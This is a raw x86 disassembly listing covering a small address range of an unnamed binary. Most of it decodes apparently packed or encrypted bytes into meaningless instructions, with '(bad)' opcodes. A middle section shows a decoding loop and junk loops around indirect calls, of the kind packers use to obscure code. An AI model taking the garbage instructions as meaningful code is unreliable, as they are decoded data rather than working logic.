  41b07b:	in     eax,dx
  41b07c:	les    edx,FWORD PTR [eax-0x70c9c46f]
  41b082:	push   ss
  41b083:	jmp    0xf96d:0x7baf8188
  41b08a:	loopne 0x41b0bf
  41b08c:	and    DWORD PTR [esi+0x70],eax
  41b08f:	push   esi
  41b090:	and    edx,DWORD PTR [ecx+ebp*2+0x77]
  41b094:	int3   
  41b095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b096:	hlt    
  41b097:	sbb    cl,bl
  41b099:	(bad)  
  41b09a:	xor    eax,0xef9e1bbd
  41b09f:	das    
  41b0a0:	or     ecx,esi
  41b0a2:	inc    ebx
  41b0a3:	mov    ch,0x47
  41b0a5:	sbb    cl,BYTE PTR [eax]
  41b0a7:	mov    bl,0x21
  41b0a9:	mov    ds:0x157b30f7,eax
  41b0ae:	and    ecx,esp
  41b0b0:	retf   
  41b0b1:	xchg   esp,eax
  41b0b2:	jg     0x41b051
  41b0b4:	loope  0x41b0cd
  41b0b6:	mov    ebp,0x1bb6ff50
  41b0bb:	les    edi,FWORD PTR [ecx-0x40]
  41b0be:	push   ds
  41b0bf:	xor    DWORD PTR [ecx-0x260f7da4],edi
  41b0c5:	mov    ds:0x8b84e6f9,eax
  41b0ca:	push   cs
  41b0cb:	pop    eax
  41b0cc:	rcl    dh,0x71
  41b0cf:	mov    edx,DWORD PTR [ebx-0x184a9797]
  41b0d5:	add    DWORD PTR [esi+0x60],ecx
  41b0d8:	dec    ecx
  41b0d9:	outs   dx,BYTE PTR ds:[esi]
  41b0da:	pop    eax
  41b0db:	ret    
  41b0dc:	add    esp,edx
  41b0de:	jbe    0x41b091
  41b0e0:	or     BYTE PTR [eax],cl
  41b0e2:	dec    ebp
  41b0e3:	sub    BYTE PTR [ebp-0xc],dh
  41b0e6:	pop    ebp
  41b0e7:	sbb    BYTE PTR [ebx+eax*8-0x5d],bl
  41b0eb:	addr16 int3 
  41b0ed:	lods   al,BYTE PTR ds:[esi]
  41b0ee:	sub    eax,0x3caca7a8
  41b0f3:	pop    eax
  41b0f4:	xchg   ebx,eax
  41b0f5:	jne    0x41b0e7
  41b0f7:	ja     0x41b103
  41b0f9:	ficomp WORD PTR [ebx+0x3f]
  41b0fc:	sub    dl,cl
  41b0fe:	and    eax,0x3bbf6ebf
  41b103:	dec    edx
  41b104:	jle    0x41b0b7
  41b106:	add    DWORD PTR [esi-0x2233d550],0xc5778a61
  41b110:	stc    
  41b111:	and    cl,BYTE PTR [ebp+0x2518df4e]
  41b117:	jno    0x41b0bf
  41b119:	test   BYTE PTR [esi+0x31],0x65
  41b11d:	pop    ecx
  41b11f:	clc    
  41b120:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b122:	and    BYTE PTR [ebx],ah
  41b124:	cld    
  41b125:	xchg   ch,al
  41b127:	mov    eax,0xe26cab7d
  41b12c:	adc    DWORD PTR [ecx+0x419cf5e8],0x4a
  41b133:	cs (bad) 
  41b135:	dec    eax
  41b136:	arpl   WORD PTR [ebp-0x5ec9bcf8],dx
  41b13c:	cmp    BYTE PTR ds:0x70e2730e,bh
  41b142:	aam    0xad
  41b144:	cmp    cl,dl
  41b146:	jno    0x41b194
  41b148:	(bad)  
  41b149:	imul   ecx,DWORD PTR [eax+0x50],0xf648c9a7
  41b150:	add    DWORD PTR [edi+0x706f4c02],0xffffff99
  41b157:	mov    cl,0x9
  41b159:	push   0x63d70ee0
  41b15e:	shl    BYTE PTR [eax+ebp*8-0x500d521a],0x95
  41b166:	pop    edi
  41b167:	frstor [ecx]
  41b169:	jmp    0x41b109
  41b16b:	je     0x41b143
  41b16d:	sub    eax,0x1982a0ed
  41b172:	and    al,0x20
  41b174:	push   cs
  41b175:	sti    
  41b176:	jbe    0x41b12b
  41b178:	push   es
  41b179:	jo     0x41b1c4
  41b17b:	pop    ebx
  41b17c:	jmp    0x23fcbf41
  41b181:	stc    
  41b182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b183:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b184:	pop    edx
  41b185:	inc    ebx
  41b186:	xchg   ebx,eax
  41b187:	pop    ecx
  41b188:	das    
  41b189:	(bad)  
  41b18a:	mov    dh,0x69
  41b18c:	push   esp
  41b18d:	ds ret 
  41b18f:	stc    
  41b190:	fwait
  41b191:	and    dh,ah
  41b193:	sbb    al,0xb3
  41b195:	ret    0x14ae
  41b198:	int    0x63
  41b19a:	inc    edx
  41b19b:	or     dl,BYTE PTR [ebx+eiz*1+0x68]
  41b19f:	(bad)  
  41b1a0:	enter  0xb0e8,0x49
  41b1a4:	repnz xchg esi,eax
  41b1a6:	cmp    BYTE PTR [eax],cl
  41b1a8:	jb     0x41b1a2
  41b1aa:	mov    dl,0x8b
  41b1ac:	xchg   ebp,eax
  41b1ad:	mov    eax,ds:0xa7a165ac
  41b1b2:	(bad)  
  41b1b3:	ds pop ecx
  41b1b5:	push   ss
  41b1b6:	out    dx,al
  41b1b7:	push   ss
  41b1b8:	jl     0x41b197
  41b1ba:	ins    BYTE PTR es:[edi],dx
  41b1bb:	xchg   DWORD PTR [edx],esp
  41b1bd:	sub    ecx,DWORD PTR [ebx-0x4cab081b]
  41b1c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1c4:	mov    edi,eax
  41b1c6:	mov    eax,0xf4314b9c
  41b1cb:	jmp    0x3095faba
  41b1d0:	mov    cl,0x4b
  41b1d2:	push   0x8f071f83
  41b1d7:	imul   eax,esp,0xb9738b8c
  41b1dd:	mov    eax,0xd8402e6c
  41b1e2:	fwait
  41b1e3:	mov    ebp,0xe7a2b3a6
  41b1e8:	mov    edx,0x6460e66d
  41b1ed:	aad    0xc5
  41b1ef:	inc    ecx
  41b1f0:	fist   DWORD PTR [ecx+0x40]
  41b1f3:	sahf   
  41b1f4:	pop    esp
  41b1f5:	and    ecx,DWORD PTR [eax]
  41b1f7:	int3   
  41b1f8:	retf   0xb472
  41b1fb:	mov    bl,0x47
  41b1fd:	jnp    0x41b1d9
  41b1ff:	jmp    0x41b19d
  41b201:	mov    ch,bl
  41b203:	push   edi
  41b204:	push   ecx
  41b205:	xchg   ebp,eax
  41b206:	outs   dx,BYTE PTR ds:[esi]
  41b207:	and    BYTE PTR [ecx],0x55
  41b20a:	ror    BYTE PTR [edx],cl
  41b20c:	mov    edx,0x322f1a3e
  41b211:	shl    BYTE PTR [ecx+eiz*1],0x7d
  41b215:	clc    
  41b216:	sub    al,dl
  41b218:	mov    eax,0x7ecf21bb
  41b21d:	xchg   DWORD PTR [ebp-0x597e5392],ebx
  41b223:	stos   DWORD PTR es:[edi],eax
  41b224:	dec    esi
  41b225:	push   edi
  41b226:	push   ebx
  41b227:	jecxz  0x41b273
  41b229:	fimul  WORD PTR [esp-0x2e]
  41b22d:	and    DWORD PTR [ebx],ebp
  41b22f:	push   es
  41b230:	retf   0xf1c
  41b233:	and    al,0x4d
  41b235:	mov    ebx,0xcd41a520
  41b23a:	jae    0x41b2ac
  41b23c:	cmp    eax,0x64
  41b23f:	sub    al,BYTE PTR [edx]
  41b241:	(bad)  
  41b243:	mov    DWORD PTR [edx+0xec0bacc],edi
  41b249:	test   DWORD PTR [edx+ebp*8],edx
  41b24c:	cmp    dl,BYTE PTR [ebp+0x6a23865d]
  41b252:	ds and al,0xdf
  41b255:	ficom  WORD PTR [ecx]
  41b257:	std    
  41b258:	daa    
  41b259:	scas   eax,DWORD PTR es:[edi]
  41b25a:	sbb    DWORD PTR [eax],eax
  41b25c:	xchg   esp,eax
  41b25d:	out    dx,eax
  41b25e:	xchg   ecx,eax
  41b25f:	dec    DWORD PTR [eax+eiz*8]
  41b262:	push   ss
  41b263:	les    edi,FWORD PTR [ecx+0x1e0fa3a5]
  41b269:	mov    ebp,0x8ef53245
  41b26e:	xor    BYTE PTR [ecx+0x655510bd],ah
  41b274:	neg    DWORD PTR [ebx]
  41b276:	popa   
  41b277:	stos   BYTE PTR es:[edi],al
  41b278:	mov    cl,0x72
  41b27a:	pop    ds
  41b27b:	popa   
  41b27c:	push   ds
  41b27d:	adc    al,bh
  41b27f:	adc    BYTE PTR [eax+edx*1],bl
  41b282:	xor    dh,BYTE PTR [edx-0x20416781]
  41b288:	xchg   esp,eax
  41b289:	(bad)  
  41b28a:	mov    edi,0x898a4683
  41b28f:	(bad)  
  41b290:	cli    
  41b291:	dec    ebp
  41b292:	sub    al,0x6f
  41b294:	push   esi
  41b295:	lock in al,dx
  41b297:	jmp    0x41b253
  41b299:	in     al,0x16
  41b29b:	inc    ecx
  41b29c:	shl    DWORD PTR [esi+0x2f],1
  41b29f:	inc    edx
  41b2a0:	adc    esi,DWORD PTR [ecx+0x70]
  41b2a3:	xor    eax,0x8f9a88b8
  41b2a8:	ds jge 0x41b291
  41b2ab:	in     eax,dx
  41b2ac:	lock fldenv ds:0x651d582
  41b2b3:	push   ebp
  41b2b4:	or     ecx,0xffffffbd
  41b2b7:	or     al,0xf4
  41b2b9:	scas   eax,DWORD PTR es:[edi]
  41b2ba:	mov    esp,0x59cf16d7
  41b2bf:	std    
  41b2c0:	les    eax,FWORD PTR [eax]
  41b2c2:	enter  0xa391,0x6e
  41b2c6:	dec    esp
  41b2c7:	mov    ebp,0xc48df339
  41b2cc:	mov    edi,DWORD PTR [eax+0x137f8a7d]
  41b2d2:	lock push ds
  41b2d4:	pop    ecx
  41b2d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2d6:	ja     0x41b302
  41b2d8:	or     al,0x9a
  41b2da:	jmp    0xa9fc:0x5a86264c
  41b2e1:	sub    eax,0x98bebf9e
  41b2e6:	mov    ch,0x22
  41b2e8:	push   edx
  41b2e9:	pop    eax
  41b2ea:	sbb    DWORD PTR [eax-0x5cb5a87c],esp
  41b2f0:	mov    ebp,0x2a8a9f6b
  41b2f5:	add    BYTE PTR [edi+0x32],dh
  41b2f8:	out    0xbe,al
  41b2fa:	jecxz  0x41b373
  41b2fc:	cwde   
  41b2fd:	inc    eax
  41b2fe:	pop    ds
  41b2ff:	shl    BYTE PTR [edx-0x6f9b709c],cl
  41b305:	dec    ecx
  41b306:	idiv   BYTE PTR [ecx+esi*8+0x14]
  41b30a:	fidivr DWORD PTR [esi]
  41b30c:	adc    BYTE PTR [ecx+esi*1],ch
  41b30f:	add    DWORD PTR cs:[edx-0x6338e9e3],ebp
  41b316:	mov    esi,0x4ae8fc69
  41b31b:	adc    esp,edx
  41b31d:	push   ebx
  41b31e:	adc    BYTE PTR [edx+0x55c3c9d4],bl
  41b324:	repnz mov esi,0x57058d9e
  41b32a:	or     bl,BYTE PTR [edi+0xc5bf1a0]
  41b330:	or     al,0xac
  41b332:	and    DWORD PTR [edx+0x1c],0x7e73d93f
  41b339:	ss mov cl,0x82
  41b33c:	mov    WORD PTR [edx-0x577e5c37],ss
  41b342:	ins    BYTE PTR es:[edi],dx
  41b343:	sahf   
  41b344:	test   al,0x37
  41b346:	cdq    
  41b347:	call   0xc8a88480
  41b34c:	push   ebx
  41b34d:	pop    es
  41b34e:	sub    eax,0xcf7c3e4c
  41b353:	jo     0x41b37e
  41b355:	fwait
  41b356:	out    0x52,al
  41b358:	sub    DWORD PTR es:[ecx+0x51ede540],eax
  41b35f:	or     eax,0xadc3b0b9
  41b364:	retf   0x3927
  41b367:	retf   0x6695
  41b36a:	push   esi
  41b36b:	push   esi
  41b36c:	into   
  41b36d:	adc    ebp,DWORD PTR fs:[ecx]
  41b370:	js     0x41b316
  41b372:	and    edx,DWORD PTR [esi+esi*1-0x7e]
  41b376:	dec    ecx
  41b377:	inc    bp
  41b379:	comiss xmm7,DWORD PTR [eax-0x44e1424e]
  41b380:	inc    ebx
  41b381:	int3   
  41b382:	xchg   esi,esi
  41b384:	loope  0x41b36c
  41b386:	push   cs
  41b387:	je     0x41b325
  41b389:	mov    bl,0x5f
  41b38b:	pop    es
  41b38c:	cld    
  41b38d:	aad    0x46
  41b38f:	scas   al,BYTE PTR es:[edi]
  41b390:	jmp    0x41b362
  41b392:	cmp    DWORD PTR [edx],0xe4216820
  41b398:	inc    ebp
  41b399:	xchg   ebp,eax
  41b39a:	xor    eax,0x8c0d1227
  41b3a0:	push   ecx
  41b3a1:	(bad)  
  41b3a2:	pop    esp
  41b3a3:	mov    al,ds:0x71ba9498
  41b3a8:	fnstcw WORD PTR [edx+ecx*8+0x7ca92576]
  41b3af:	sub    bl,BYTE PTR ds:0x883a21e3
  41b3b5:	pop    ecx
  41b3b6:	in     al,dx
  41b3b7:	sub    BYTE PTR ds:0xf6a0964,al
  41b3bd:	icebp  
  41b3be:	iret   
  41b3bf:	mov    ebx,?
  41b3c1:	pop    ecx
  41b3c2:	and    al,0x48
  41b3c4:	(bad)  
  41b3c6:	icebp  
  41b3c7:	or     ch,bh
  41b3c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3ca:	cmp    DWORD PTR [ecx+eiz*2-0xf],edi
  41b3ce:	pop    ss
  41b3cf:	cdq    
  41b3d0:	pushf  
  41b3d1:	push   es
  41b3d2:	nop
  41b3d3:	ret    0x5c6b
  41b3d6:	les    edx,FWORD PTR [eax+0x16]
  41b3d9:	aam    0x8b
  41b3db:	mov    cl,0xc9
  41b3dd:	push   0x622fbb92
  41b3e2:	jle    0x41b3d8
  41b3e4:	lods   al,BYTE PTR ds:[esi]
  41b3e5:	xor    DWORD PTR [eax],eax
  41b3e7:	mov    cl,BYTE PTR [ecx+0x2f]
  41b3ea:	jne    0x41b41f
  41b3ec:	sub    al,0x60
  41b3ee:	aas    
  41b3ef:	and    dl,cl
  41b3f1:	test   al,0x91
  41b3f3:	fistp  DWORD PTR [ebx-0x35]
  41b3f6:	ret    
  41b3f7:	(bad)  
  41b3f8:	iret   
  41b3f9:	inc    edx
  41b3fa:	and    edi,DWORD PTR [esi-0x17]
  41b3fd:	push   edx
  41b3fe:	pusha  
  41b3ff:	push   esp
  41b400:	adc    DWORD PTR [ebp+0x695e93c8],eax
  41b406:	cmp    ebp,eax
  41b408:	scas   al,BYTE PTR es:[edi]
  41b409:	or     BYTE PTR [esi+0x7807a1fb],ah
  41b40f:	mov    al,ds:0xb1a52035
  41b414:	sar    ebp,1
  41b416:	push   eax
  41b417:	mov    eax,ds:0x7d17eb19
  41b41c:	sti    
  41b41d:	push   ecx
  41b41e:	lahf   
  41b41f:	push   edx
  41b420:	push   ebp
  41b421:	push   esp
  41b422:	inc    edx
  41b423:	leave  
  41b424:	ret    0xe5c5
  41b427:	fild   DWORD PTR [ebp+0x50]
  41b42a:	inc    ecx
  41b42b:	inc    ebx
  41b42c:	mov    ds:0x6bab0da0,al
  41b431:	sub    BYTE PTR [ecx+0x24a7cecb],dh
  41b437:	retf   
  41b438:	aad    0x39
  41b43a:	mov    esi,0xeb50716d
  41b43f:	xchg   ebp,eax
  41b440:	jmp    0x7f4577a4
  41b445:	std    
  41b446:	rol    DWORD PTR [ecx+ebp*4+0x17],1
  41b44a:	mov    edx,0x3a3ec2e4
  41b44f:	fnsave [esi-0x20]
  41b452:	mov    dh,0x21
  41b454:	gs int 0xb3
  41b457:	enter  0x81,0x90
  41b45b:	and    DWORD PTR [edx+0x4317f929],edi
  41b461:	shr    BYTE PTR [ebp+0x4f],0x7
  41b465:	inc    edi
  41b466:	inc    ecx
  41b467:	cmp    ebx,esp
  41b469:	pop    esp
  41b46a:	cmp    eax,DWORD PTR [edx+0x4c]
  41b46d:	inc    eax
  41b46e:	jae    0x41b480
  41b470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b471:	ror    BYTE PTR [esi],1
  41b473:	sub    eax,0x5041006d
  41b478:	pop    esi
  41b479:	xor    eax,0x75a73210
  41b47e:	push   esp
  41b47f:	mov    esp,0x2746b692
  41b484:	xchg   esi,eax
  41b485:	mov    al,0xb8
  41b487:	fst    DWORD PTR [esi+0x28]
  41b48a:	jae    0x41b48e
  41b48c:	popa   
  41b48d:	in     eax,dx
  41b48e:	and    dl,BYTE PTR [ebx+0x19]
  41b491:	pusha  
  41b492:	inc    ecx
  41b493:	add    bh,BYTE PTR [ecx]
  41b495:	mov    ebx,0x2100a87a
  41b49a:	popa   
  41b49b:	ja     0x41b42b
  41b49d:	cmp    BYTE PTR [edx],cl
  41b49f:	push   ss
  41b4a0:	sbb    esi,DWORD PTR [eax+0x154477b9]
  41b4a6:	pop    ecx
  41b4a7:	mov    dl,0xf7
  41b4a9:	cmp    eax,0x9d71e662
  41b4ae:	jne    0x41b47a
  41b4b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4b1:	or     eax,0xb44a7720
  41b4b6:	ins    BYTE PTR es:[edi],dx
  41b4b7:	sub    al,0x85
  41b4b9:	cli    
  41b4ba:	push   esi
  41b4bb:	std    
  41b4bc:	(bad)  
  41b4bd:	fmul   DWORD PTR [esi+ebp*1+0x75bda574]
  41b4c4:	dec    ebx
  41b4c5:	fs mov cl,0x8c
  41b4c8:	xchg   ebp,eax
  41b4c9:	lock adc esi,esp
  41b4cc:	pop    edi
  41b4cd:	test   al,0x2e
  41b4cf:	jae    0x41b54b
  41b4d1:	cmp    bl,BYTE PTR [edi-0x1924795a]
  41b4d7:	jmp    0x7316edad
  41b4dc:	inc    esp
  41b4dd:	div    DWORD PTR [edi]
  41b4df:	mov    cl,0x70
  41b4e1:	push   cs
  41b4e2:	fild   QWORD PTR [ebx]
  41b4e4:	es and al,0xcc
  41b4e7:	sub    al,0x1e
  41b4e9:	cmp    bh,BYTE PTR [esi]
  41b4eb:	scas   eax,DWORD PTR es:[edi]
  41b4ec:	xchg   esi,eax
  41b4ed:	inc    esi
  41b4ee:	mov    ds:0x8bde7b02,eax
  41b4f3:	xor    DWORD PTR [edx-0x11316c6a],ebp
  41b4f9:	aad    0x59
  41b4fb:	(bad)
  41b500:	scas   al,BYTE PTR es:[edi]
  41b501:	dec    esi
  41b502:	pop    esp
  41b503:	xor    eax,0xba7e792e
  41b508:	data16 arpl WORD PTR [edi+0x4ec3a925],bx
  41b50f:	and    DWORD PTR [ebp-0x29],esp
  41b512:	mov    cl,0x59
  41b514:	clc    
  41b515:	mov    edx,0x811c6cbd
  41b51a:	ja     0x41b532
  41b51c:	jo     0x41b4fd
  41b51e:	stc    
  41b51f:	jle    0x41b4cd
  41b521:	mov    BYTE PTR [ebp+0x2e97a64],bl
  41b527:	fcmovb st,st(1)
  41b529:	mov    ebx,0x8f3303e9
  41b52e:	push   eax
  41b52f:	push   0xffffff96
  41b531:	jmp    0x11d62659
  41b536:	(bad)  
  41b537:	fsubr  QWORD PTR ds:0x81a64921
  41b53d:	aas    
  41b53e:	les    ecx,FWORD PTR [ebp-0x10775b0]
  41b544:	aam    0xf9
  41b546:	push   0xa3937d31
  41b54b:	fdiv   QWORD PTR [ebx]
  41b54d:	into   
  41b54e:	add    DWORD PTR [ecx+0x6ab7dc9a],eax
  41b554:	xchg   esi,eax
  41b555:	mov    ecx,DWORD PTR [ebp+0x8]
  41b558:	mov    edx,DWORD PTR [ebp-0x4c]
  41b55b:	add    ecx,edi
  41b55d:	and    ecx,edx
  41b55f:	mov    DWORD PTR [ebp-0x4c],ecx
  41b562:	mov    ecx,DWORD PTR [ebp+0x8]
  41b565:	mov    edx,DWORD PTR [ebp-0x48]
  41b568:	lea    ecx,[edx+ecx*1+0x241fcdf]
  41b56f:	mov    DWORD PTR [ebp-0x48],ecx
  41b572:	mov    ecx,DWORD PTR [ebp+0x8]
  41b575:	mov    edx,0xfa5e1524
  41b57a:	sub    edx,ecx
  41b57c:	add    edx,DWORD PTR [ebp-0x44]
  41b57f:	mov    DWORD PTR [ebp-0x44],edx
  41b582:	mov    ecx,DWORD PTR [ebp+0x8]
  41b585:	xor    ecx,eax
  41b587:	add    ecx,esi
  41b589:	jne    0x4191ae
  41b58f:	jmp    0x41b621
  41b594:	mov    ecx,DWORD PTR [ebp+0x8]
  41b597:	mov    edx,DWORD PTR [ebp-0x8]
  41b59a:	xor    ecx,eax
  41b59c:	xor    edx,eax
  41b59e:	sub    ecx,edx
  41b5a0:	sub    ecx,esi
  41b5a2:	xor    ecx,eax
  41b5a4:	mov    DWORD PTR [ebp+0x8],ecx
  41b5a7:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5aa:	mov    edx,DWORD PTR [ebp-0x58]
  41b5ad:	add    ecx,0x5708e2
  41b5b3:	imul   ecx,edx
  41b5b6:	mov    DWORD PTR [ebp-0x58],ecx
  41b5b9:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x54]
  41b5bf:	add    ecx,0x64f880
  41b5c5:	or     ecx,edx
  41b5c7:	mov    DWORD PTR [ebp-0x54],ecx
  41b5ca:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5cd:	mov    edx,DWORD PTR [ebp-0x50]
  41b5d0:	add    ecx,0x242ebf1
  41b5d6:	xor    ecx,edx
  41b5d8:	mov    DWORD PTR [ebp-0x50],ecx
  41b5db:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5de:	mov    edx,DWORD PTR [ebp-0x4c]
  41b5e1:	add    ecx,edi
  41b5e3:	and    ecx,edx
  41b5e5:	mov    DWORD PTR [ebp-0x4c],ecx
  41b5e8:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5eb:	mov    edx,DWORD PTR [ebp-0x48]
  41b5ee:	lea    ecx,[edx+ecx*1+0x241fcdf]
  41b5f5:	mov    DWORD PTR [ebp-0x48],ecx
  41b5f8:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5fb:	mov    edx,0xfa5e1524
  41b600:	sub    edx,ecx
  41b602:	add    edx,DWORD PTR [ebp-0x44]
  41b605:	mov    DWORD PTR [ebp-0x44],edx
  41b608:	mov    ecx,DWORD PTR [ebp+0x8]
  41b60b:	xor    ecx,eax
  41b60d:	add    ecx,esi
  41b60f:	jne    0x41b594
  41b615:	mov    ecx,DWORD PTR [ebp-0x8]
  41b618:	xor    ecx,eax
  41b61a:	mov    eax,DWORD PTR [ebp+0x10]
  41b61d:	add    ecx,esi
  41b61f:	mov    DWORD PTR [eax],ecx
  41b621:	pop    edi
  41b622:	pop    esi
  41b623:	pop    ebx
  41b624:	leave  
  41b625:	ret    0xc
  41b628:	push   ebp
  41b629:	mov    ebp,esp
  41b62b:	sub    esp,0x78
  41b62e:	push   esi
  41b62f:	mov    DWORD PTR ds:0x42b21e,0x12
  41b639:	cmp    DWORD PTR ds:0x42b21e,0x0
  41b640:	je     0x41b684
  41b646:	cmp    DWORD PTR ds:0x42b21e,0x16
  41b64d:	jle    0x41b684
  41b653:	jmp    0x41b672
  41b658:	push   0x42b1fa
  41b65d:	push   0x8597
  41b662:	push   0x42a285
  41b667:	push   0x42a1b7
  41b66c:	call   DWORD PTR ds:0x42b31e
  41b672:	mov    esi,DWORD PTR ds:0x42b21e
  41b678:	dec    esi
  41b679:	mov    DWORD PTR ds:0x42b21e,esi
  41b67f:	jmp    0x41b639
  41b684:	push   edi
  41b685:	sub    DWORD PTR ds:0x42b1ca,0x4941
  41b68f:	mov    eax,ds:0x42a472
  41b694:	xor    esi,esi
  41b696:	xor    esi,DWORD PTR ds:0x42b1d6
  41b69c:	add    esi,DWORD PTR ds:0x42b1da
  41b6a2:	mov    DWORD PTR ds:0x42b1d6,esi
  41b6a8:	mov    DWORD PTR [ebp-0x24],eax
  41b6ab:	and    DWORD PTR ds:0x42b226,edx
  41b6b1:	mov    eax,ds:0x42a592
  41b6b6:	mov    ecx,DWORD PTR ds:0x42b256
  41b6bc:	mov    ecx,DWORD PTR [ecx]
  41b6be:	xor    DWORD PTR ds:0x42b1f2,ecx
  41b6c4:	mov    DWORD PTR [ebp-0x30],eax
  41b6c7:	mov    DWORD PTR ds:0x42b1b2,0x10
  41b6d1:	cmp    DWORD PTR ds:0x42b1b2,0x0
  41b6d8:	je     0x41b70e
  41b6de:	cmp    DWORD PTR ds:0x42b1b2,0x1e
  41b6e5:	ja     0x41b70e
  41b6eb:	jmp    0x41b6fb
  41b6f0:	push   0x25ea
  41b6f5:	call   DWORD PTR ds:0x42b322
  41b6fb:	xor    eax,eax
  41b6fd:	xor    eax,DWORD PTR ds:0x42b1b2
  41b703:	dec    eax
  41b704:	mov    ds:0x42b1b2,eax
  41b709:	jmp    0x41b6d1
  41b70e:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  41b715:	and    DWORD PTR ds:0x42b21e,0x0
  41b71f:	jmp    0x41b733
  41b724:	xor    esi,esi
  41b726:	add    esi,DWORD PTR ds:0x42b21e
  41b72c:	inc    esi
  41b72d:	mov    DWORD PTR ds:0x42b21e,esi
  41b733:	cmp    DWORD PTR ds:0x42b21e,0x14
  41b73a:	jae    0x41b77c
  41b740:	cmp    DWORD PTR ds:0x42b21e,0x7
  41b747:	jl     0x41b77c
  41b74d:	jmp    0x41b75d
  41b752:	push   0x3b69
  41b757:	call   DWORD PTR ds:0x42b326
  41b75d:	cmp    DWORD PTR ds:0x42b21e,0x6
  41b764:	jne    0x41b777
  41b76a:	mov    esi,DWORD PTR ds:0x42b21e
  41b770:	inc    esi
  41b771:	mov    DWORD PTR ds:0x42b21e,esi
  41b777:	jmp    0x41b724
  41b77c:	mov    DWORD PTR [ebp-0x28],0xf89c85a2
  41b783:	or     eax,DWORD PTR ds:0x42b212
  41b789:	mov    eax,DWORD PTR [ebp-0x10]
  41b78c:	and    DWORD PTR ds:0x42b1c2,0x0
  41b796:	jmp    0x41b7aa
  41b79b:	xor    ecx,ecx
  41b79d:	or     ecx,DWORD PTR ds:0x42b1c2
  41b7a3:	inc    ecx
  41b7a4:	mov    DWORD PTR ds:0x42b1c2,ecx
  41b7aa:	cmp    DWORD PTR ds:0x42b1c2,0x16
  41b7b1:	jae    0x41b7ee
  41b7b7:	cmp    DWORD PTR ds:0x42b1c2,0x22
  41b7be:	jb     0x41b7ee
  41b7c4:	jmp    0x41b7e9
  41b7c9:	push   0x42a121
  41b7ce:	push   0x73a7
  41b7d3:	push   DWORD PTR [ebp-0x18]
  41b7d6:	push   0x5cd1
  41b7db:	push   0x2368
  41b7e0:	push   DWORD PTR [ebp-0xc]
  41b7e3:	call   DWORD PTR ds:0x42b2ea
  41b7e9:	jmp    0x41b79b
  41b7ee:	mov    ecx,DWORD PTR [ebp-0x10]
  41b7f1:	mov    DWORD PTR ds:0x42b1be,0x10
  41b7fb:	cmp    DWORD PTR ds:0x42b1be,0x0
  41b802:	je     0x41b85b
  41b808:	cmp    DWORD PTR ds:0x42b1be,0x9
  41b80f:	jle    0x41b85b
  41b815:	jmp    0x41b82f
  41b81a:	push   0x42a03d
  41b81f:	push   0x0
  41b821:	push   DWORD PTR [ebp-0xc]
  41b824:	push   0x5431
  41b829:	call   DWORD PTR ds:0x42b2ee
  41b82f:	cmp    DWORD PTR ds:0x42b1be,0xa
  41b836:	jne    0x41b849
  41b83c:	mov    edi,DWORD PTR ds:0x42b1be
  41b842:	dec    edi
  41b843:	mov    DWORD PTR ds:0x42b1be,edi
  41b849:	mov    edi,DWORD PTR ds:0x42b1be
  41b84f:	dec    edi
  41b850:	mov    DWORD PTR ds:0x42b1be,edi
  41b856:	jmp    0x41b7fb
  41b85b:	sub    eax,ecx
  41b85d:	and    esi,esi
  41b85f:	jmp    0x41dbf0
  41b864:	xchg   ch,bl
  41b866:	fdiv   st,st(3)
  41b868:	test   dl,ah
  41b86a:	xchg   BYTE PTR [edx+0x1c89e04a],dl
  41b870:	mov    esi,ebp
  41b872:	push   esp
  41b873:	jb     0x41b863
  41b875:	inc    DWORD PTR [eax-0x7ca1f07d]
  41b87b:	cmp    DWORD PTR [ebp-0x5a3418d6],0x3e
  41b882:	pop    ecx
  41b883:	lods   eax,DWORD PTR ds:[esi]
  41b884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b885:	ins    BYTE PTR es:[edi],dx
  41b886:	dec    esi
  41b887:	jno    0x41b83d
  41b889:	inc    edx
  41b88a:	cwde   
  41b88b:	mov    al,ds:0x9bb252a3
  41b890:	(bad)  
  41b891:	dec    ebp
  41b892:	sub    al,dh
  41b894:	cmp    eax,0x5aa56b24
  41b899:	mov    ds:0xd72a9338,eax
  41b89e:	rcl    BYTE PTR [ebp+0x165e5643],cl
  41b8a4:	pop    eax
  41b8a5:	xor    al,0xcf
  41b8a7:	in     eax,dx
  41b8a8:	jl     0x41b8df
  41b8aa:	pop    ss
  41b8ab:	rol    DWORD PTR [ebp-0x33],1
  41b8ae:	inc    edi
  41b8af:	jae    0x41b891
  41b8b1:	add    al,dl
  41b8b3:	jp     0x41b901
  41b8b5:	ja     0x41b87a
  41b8b7:	adc    edx,DWORD PTR [edi]
  41b8b9:	mov    edx,DWORD PTR [edx-0x7d]
  41b8bc:	ds dec esp
  41b8be:	and    al,0xc7
  41b8c0:	jnp    0x41b8f4
  41b8c2:	call   0x3c04:0x8363260c
  41b8c9:	or     al,0x91
  41b8cb:	jmp    0x41b852
  41b8cd:	sbb    edx,ecx
  41b8cf:	mov    ds:0x1a866e77,eax
  41b8d4:	aad    0x9f
  41b8d6:	cs add eax,0x75ae1823
  41b8dc:	push   0xabde883
  41b8e1:	(bad)  
  41b8e2:	cli    
  41b8e3:	lods   eax,DWORD PTR ds:[esi]
  41b8e4:	and    al,cl
  41b8e6:	out    0x7a,eax
  41b8e8:	or     eax,0xe2f06cc5
  41b8ed:	retf   0xf358
  41b8f0:	dec    esp
  41b8f1:	sbb    BYTE PTR ds:0xa81eb89c,dl
  41b8f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8f8:	mov    ebx,0xa798cf15
  41b8fd:	std    
